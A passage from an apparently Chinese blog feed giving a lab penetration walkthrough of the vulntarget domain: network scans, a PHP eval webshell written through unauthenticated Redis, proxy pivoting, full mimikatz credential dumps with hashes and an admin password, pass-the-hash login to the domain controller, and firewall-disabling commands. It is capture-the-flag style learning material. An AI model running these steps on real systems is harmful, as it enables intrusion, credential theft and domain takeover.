class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;fscan64.exe -h 10.0.20.0/24 -p 1-10000</span><br><span class="line">fscan64.exe -h 10.0.20.0/24 -p 1-10000</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.0.20.128     is alive</span><br><span class="line">(icmp) Target 10.0.20.130     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 2</span><br><span class="line">10.0.20.130:80 open</span><br><span class="line">10.0.20.128:80 open</span><br><span class="line">10.0.20.128:110 open</span><br><span class="line">10.0.20.128:135 open</span><br><span class="line">10.0.20.130:139 open</span><br><span class="line">10.0.20.128:139 open</span><br><span class="line">10.0.20.130:135 open</span><br><span class="line">10.0.20.128:445 open</span><br><span class="line">10.0.20.130:445 open</span><br><span class="line">10.0.20.128:1188 open</span><br><span class="line">10.0.20.128:3336 open</span><br><span class="line">10.0.20.128:5357 open</span><br><span class="line">10.0.20.130:5985 open</span><br><span class="line">10.0.20.130:6379 open</span><br><span class="line">10.0.20.128:8750 open</span><br><span class="line">[*] alive ports len is: 15</span><br><span class="line">start vulscan</span><br><span class="line">[+] 10.0.20.128 MS17-010        (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]10.0.20.128</span><br><span class="line">   [-&gt;]win7-PC</span><br><span class="line">   [-&gt;]192.168.52.132</span><br><span class="line">   [-&gt;]10.0.20.128</span><br><span class="line">[*] WebTitle: http://10.0.20.128:8750   code:403 len:564    title:403 Forbidden</span><br><span class="line">[*] WebTitle: http://10.0.20.128        code:200 len:10065  title:通达OA网络智能办公系统</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]10.0.20.130</span><br><span class="line">   [-&gt;]win2016</span><br><span class="line">   [-&gt;]10.0.10.111</span><br><span class="line">   [-&gt;]10.0.20.130</span><br><span class="line">[+] Redis:10.0.20.130:6379 unauthorized file:C:\Program Files\Redis/dump.rdb</span><br><span class="line">[*] WebTitle: http://10.0.20.130        code:200 len:11     title:None</span><br><span class="line">[+] InfoScan:http://10.0.20.128        [通达OA] </span><br><span class="line">[*] WebTitle: http://10.0.20.128:5357   code:503 len:326    title:Service Unavailable</span><br><span class="line">[*] NetBios: 10.0.20.130     win2016.vulntarget.com              Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: http://10.0.20.130:5985   code:404 len:315    title:Not Found</span><br><span class="line">[+] http://10.0.20.128 tongda-user-session-disclosure </span><br><span class="line">[+] http://10.0.20.128:8750 tongda-user-session-disclosure </span><br><span class="line">[+] http://10.0.20.128:8750 poc-yaml-tongda-oa-v11.9-api.ali.php-fileupload </span><br><span class="line">已完成 15/15</span><br><span class="line">[*] 扫描结束,耗时: 56.0155853s</span><br></pre></td></tr></table></figure><p>信息整理一下  一共就是两个ip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">10.0.20.128</span><br><span class="line">10.0.20.130 这个就是域里的一台机器 5985 6379  win2016.vulntarget.com  </span><br><span class="line">域 vulntarget.com  6379端口是存在未授权的</span><br><span class="line"></span><br><span class="line">这里的这台win16机器的网络地址</span><br><span class="line"></span><br><span class="line">10.0.20.130</span><br><span class="line">10.0.10.111</span><br></pre></td></tr></table></figure><p>上stowaway挂代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload agent.exe C:\\</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231113104956522.png" alt="image-20231113104956522"></p><p>然后扫一下目录 发现phpinfo.php文件</p><p><img src="../images/image-20231113105109436.png" alt="image-20231113105109436"></p><p>找到网站目录  然后因为redis纯在未授权  然后我们直接上传shell就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">config set dir &quot;C:/phpStudy/PHPTutorial/WWW/&quot;</span><br><span class="line"></span><br><span class="line">config set dbfilename 1.php</span><br><span class="line"></span><br><span class="line">set 1 &quot;&lt;?php @eval($_POST[&#x27;1&#x27;]);?&gt;&quot;</span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231113105410071.png" alt="image-20231113105410071"></p><p>成功写入  然后上蚁剑</p><p><img src="../images/image-20231113105550525.png" alt="image-20231113105550525"></p><p>上传fscan扫一下内网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   IPv4 地址 . . . . . . . . . . . . : 10.0.20.130</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : </span><br><span class="line">以太网适配器 Ethernet1:</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::a195:ff2a:a6da:221c%12</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 10.0.10.111</span><br></pre></td></tr></table></figure><p>但是蚁剑这个终端的话太抽象了  fscan扫不了  于是上Viper</p><p><img src="../images/image-20231113110229946.png" alt="image-20231113110229946"></p><p>上线成功  开始扫一下内网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan64.exe -h 10.0.10.0/24 -p 1-10000</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231113110402882.png" alt="image-20231113110402882"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">C:\phpStudy\PHPTutorial\WWW&gt;type result.txt</span><br><span class="line">type result.txt</span><br><span class="line">10.0.10.110:53 open</span><br><span class="line">10.0.10.110:88 open</span><br><span class="line">10.0.10.111:80 open</span><br><span class="line">10.0.10.110:139 open</span><br><span class="line">10.0.10.110:135 open</span><br><span class="line">10.0.10.111:135 open</span><br><span class="line">10.0.10.111:139 open</span><br><span class="line">10.0.10.110:389 open</span><br><span class="line">10.0.10.110:445 open</span><br><span class="line">10.0.10.111:445 open</span><br><span class="line">10.0.10.110:464 open</span><br><span class="line">10.0.10.110:593 open</span><br><span class="line">10.0.10.110:636 open</span><br><span class="line">10.0.10.110:3268 open</span><br><span class="line">10.0.10.110:3269 open</span><br><span class="line">10.0.10.111:5985 open</span><br><span class="line">10.0.10.110:5985 open</span><br><span class="line">10.0.10.111:6379 open</span><br><span class="line">10.0.10.110:9389 open</span><br><span class="line">[+] Redis:10.0.10.111:6379 unauthorized file:C:\phpStudy\PHPTutorial\WWW/1.php</span><br><span class="line">[*] WebTitle: http://10.0.10.111        code:200 len:11     title:None</span><br><span class="line">[*] NetBios: 10.0.10.110     [+]DC VULNTARGET\WIN2019       </span><br><span class="line">[*] WebTitle: http://10.0.10.111:5985   code:404 len:315    title:Not Found</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]10.0.10.110</span><br><span class="line">   [-&gt;]win2019</span><br><span class="line">   [-&gt;]10.0.10.110</span><br><span class="line">[*] WebTitle: http://10.0.10.110:5985   code:404 len:315    title:Not Found</span><br><span class="line">10.0.10.110:135 open</span><br><span class="line">10.0.10.111:135 open</span><br><span class="line">10.0.10.110:139 open</span><br><span class="line">10.0.10.110:88 open</span><br><span class="line">10.0.10.111:80 open</span><br><span class="line">10.0.10.111:139 open</span><br><span class="line">10.0.10.110:53 open</span><br><span class="line">10.0.10.110:389 open</span><br><span class="line">10.0.10.110:445 open</span><br><span class="line">10.0.10.111:445 open</span><br><span class="line">10.0.10.110:464 open</span><br><span class="line">10.0.10.110:593 open</span><br><span class="line">10.0.10.110:636 open</span><br><span class="line">10.0.10.110:3268 open</span><br><span class="line">10.0.10.110:3269 open</span><br><span class="line">10.0.10.111:5985 open</span><br><span class="line">10.0.10.110:5985 open</span><br><span class="line">10.0.10.111:6379 open</span><br><span class="line">10.0.10.110:9389 open</span><br><span class="line">[+] Redis:10.0.10.111:6379 unauthorized file:C:\phpStudy\PHPTutorial\WWW/1.php</span><br><span class="line">[*] WebTitle: http://10.0.10.111        code:200 len:11     title:None</span><br><span class="line">[*] WebTitle: http://10.0.10.111:5985   code:404 len:315    title:Not Found</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]10.0.10.110</span><br><span class="line">   [-&gt;]win2019</span><br><span class="line">   [-&gt;]10.0.10.110</span><br><span class="line">[*] NetBios: 10.0.10.110     [+]DC VULNTARGET\WIN2019       </span><br><span class="line">[*] WebTitle: http://10.0.10.110:5985   code:404 len:315    title:Not Found</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现域控了 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.0.10.110 DC VULNTARGET\WIN2019    开了个5985端口  winrm服务</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>收集一下域内win16的信息  看看有没有能到域控的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">跑一下sharphound  上传sharphound上去  然后跑就行了</span><br><span class="line"></span><br><span class="line">SharpHound.exe --CollectionMethods All --Domain vulntarget.com --ExcludeDCs</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231113111238366.png" alt="image-20231113111238366"></p><p>这里就是关键了  因为域管登录过win16这台机器  所以留下了凭据 </p><p>我们直接上mimikatz跑logonpassword就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : 0 ; 329364 (00000000:00050694)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : win2016</span><br><span class="line">Domain            : VULNTARGET</span><br><span class="line">Logon Server      : WIN2019</span><br><span class="line">Logon Time        : 2023/11/11 22:30:17</span><br><span class="line">SID               : S-1-5-21-3795598892-1521228294-2653055093-1601</span><br><span class="line">        msv :</span><br><span class="line">         [00000005] Primary</span><br><span class="line">         * Username : win2016</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * NTLM     : dfc8d2bfa540a0a6e2248a82322e654e</span><br><span class="line">         * SHA1     : cfa10f59337120a5ea6882b11c1c9f451f5f4ea6</span><br><span class="line">         * DPAPI    : 27bd7cc4802079a6e008ed2d917c4323</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : win2016</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : win2016</span><br><span class="line">         * Domain   : VULNTARGET.COM</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 71684 (00000000:00011804)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/11/11 22:29:13</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000005] Primary</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * NTLM     : e0cd419213811fd910ca6c3c42d764e7</span><br><span class="line">         * SHA1     : cd721f807e68ce07a4d0fe80b9356e93986d5ef1</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : vulntarget.com</span><br><span class="line">         * Password : NDjm,P3trN$LQ-$cZ9bE&lt;VNzB$JaIR4&gt;T+JNW7Qk?gHpDo(+H&gt;zF^t-gG&gt;,0MmLMBzfZ^ ]/oRL*&lt;&gt;j,WTp+5yF2cA.d%b&gt;^:n/Bmf64:Qx.:/s5Y1&quot;&gt;5&gt;wZ</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 71573 (00000000:00011795)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/11/11 22:29:13</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000005] Primary</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * NTLM     : 1ee53d0627d3a9c940d6579e3ea1d158</span><br><span class="line">         * SHA1     : 668e4f390b4fa54225f4a12106fbceab3056f83c</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : vulntarget.com</span><br><span class="line">         * Password : 27 7d f9 fa 4a f9 61 25 60 4e 75 42 f7 d9 c6 a0 60 c7 f1 eb 48 b3 73 bf 64 0e dd 5b 92 46 f1 2a cb 7d 19 a4 38 19 aa fb 8a a7 56 ca 40 fb 07 3b f3 c7 d4 ca b7 f3 32 49 56 92 69 78 a0 f4 66 5b 8a 40 46 9e ac 7e dc a7 18 85 68 68 65 d1 b3 1a b3 8b 76 e8 c8 ec 18 58 78 86 10 0e ae 1d 2f b5 ac 9c 29 2c c9 6e d6 eb f3 70 91 fd f4 12 11 e0 8d 48 e4 89 20 73 f4 c0 ae d3 d0 f1 45 e0 be e3 39 6a 8f 7e a4 08 4c a7 41 3d ef 23 ad 19 f4 c1 21 b1 9e 81 39 99 33 d3 8f 83 d6 49 02 59 f7 b9 6d 63 bb 2e 50 be 8f 4e f4 37 7a fa 13 95 93 d6 80 96 c0 d1 7b c6 2c 90 ca 1e 0a da 42 8b 3e 92 c7 65 85 45 41 a4 b6 76 21 35 e2 96 94 a4 07 28 c3 49 d9 31 05 24 28 07 de 8c 64 fa 8d 93 d3 ed ec 4c 75 e5 e1 05 bc 6f 6b 41 ef ed d9 f2 43 a4 </span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN2016$</span><br><span class="line">Domain            : VULNTARGET</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/11/11 22:29:13</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        msv :</span><br><span class="line">         [00000005] Primary</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * NTLM     : 1ee53d0627d3a9c940d6579e3ea1d158</span><br><span class="line">         * SHA1     : 668e4f390b4fa54225f4a12106fbceab3056f83c</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : win2016$</span><br><span class="line">         * Domain   : VULNTARGET.COM</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 41061 (00000000:0000a065)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/11/11 22:29:13</span><br><span class="line">SID               : </span><br><span class="line">        msv :</span><br><span class="line">         [00000005] Primary</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * NTLM     : 1ee53d0627d3a9c940d6579e3ea1d158</span><br><span class="line">         * SHA1     : 668e4f390b4fa54225f4a12106fbceab3056f83c</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 548857 (00000000:00085ff9)</span><br><span class="line">Session           : CachedInteractive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : VULNTARGET</span><br><span class="line">Logon Server      : WIN2019</span><br><span class="line">Logon Time        : 2023/11/11 22:31:21</span><br><span class="line">SID               : S-1-5-21-3795598892-1521228294-2653055093-500</span><br><span class="line">        msv :</span><br><span class="line">         [00000005] Primary</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * NTLM     : c7c654da31ce51cbeecfef99e637be15</span><br><span class="line">         * SHA1     : 20045722851488e55f32110eb0a5222ba793fe2f</span><br><span class="line">         * DPAPI    : 4df31630e621c2278c303c0940d878ff</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : VULNTARGET.COM</span><br><span class="line">         * Password : Admin@666</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/11/11 22:29:13</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WIN2016$</span><br><span class="line">Domain            : VULNTARGET</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/11/11 22:29:13</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : win2016$</span><br><span class="line">         * Domain   : VULNTARGET.COM</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br></pre></td></tr></table></figure><p>然后找了这个域管的hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[00000005] Primary</span><br><span class="line">* Username : Administrator</span><br><span class="line">* Domain   : VULNTARGET</span><br><span class="line">* NTLM     : c7c654da31ce51cbeecfef99e637be15</span><br><span class="line">* SHA1     : 20045722851488e55f32110eb0a5222ba793fe2f</span><br><span class="line">* DPAPI    : 4df31630e621c2278c303c0940d878ff</span><br></pre></td></tr></table></figure><p>因为这个域管在10段  所以得上二级代理</p><p><a href="https://www.freebuf.com/sectool/359841.htmlStowaway">https://www.freebuf.com/sectool/359841.htmlStowaway</a></p><p>早win7机器上再开一个端口</p><p><img src="../images/image-20231113111634856.png" alt="image-20231113111634856"></p><p>然后使用win16机器连接这个端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">agent.exe -c 10.0.20.128:1235</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231113111804433.png" alt="image-20231113111804433"></p><p><img src="../images/image-20231113111823827.png" alt="image-20231113111823827"></p><p>然后给proxifier再加上一条规则</p><p><img src="../images/image-20231113111851438.png" alt="image-20231113111851438"></p><p>再proxychains这个配置文件上再加上这一条就行了</p><p><img src="../images/image-20231113111938654.png" alt="image-20231113111938654"></p><p>因为我们获取了域管的hash值  那么我们就直接evil-winrm登录就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains evil-winrm -i 10.0.10.110 -u Administrator -H &quot;c7c654da31ce51cbeecfef99e637be15&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231113112046978.png" alt="image-20231113112046978"></p><p>拿下了</p><p>最后讲一下怎么再没开启3389的情况下开启3389端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><p>这里得获取到域控之后才有权限</p><p>(这里我没尝试成功  先存着  以后可能有用)</p><p><img src="../images/image-20231113113141354.png" alt="image-20231113113141354"></p><p>就是第二步的时候出错</p><p>关闭防火墙命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p>新的知识点就是学会了这个 二级代理</p><p><img src="../images/image-20231113113913305.png" alt="image-20231113113913305"></p><p><strong>二级代理同样能上 viper  但是注意的一点就是 防火墙必须得关掉</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231113114204412.png" alt="image-20231113114204412"></p><p><img src="../images/image-20231113114152747.png" alt="image-20231113114152747"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;192.168.52.132  外网目标ip&lt;/p&gt;
&lt;p&gt;fscan扫一下&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/s</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>BugKu-渗透测试3</title>
